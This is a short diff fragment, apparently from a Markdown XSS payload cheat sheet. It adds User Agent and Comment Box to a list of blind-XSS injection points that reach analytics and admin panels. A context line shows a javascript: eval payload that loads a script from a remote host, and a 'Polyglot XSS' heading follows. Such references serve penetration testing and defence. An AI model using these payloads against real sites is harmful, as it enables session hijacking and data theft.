@@ -416,6 +416,12 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'https://yoursu
 - Referer Header
   - Custom Site Analytics
   - Administrative Panel logs
+- User Agent
+  - Custom Site Analytics
+  - Administrative Panel logs
+- Comment Box
+  - Administrative Panel
+
 
 ## Polyglot XSS
 
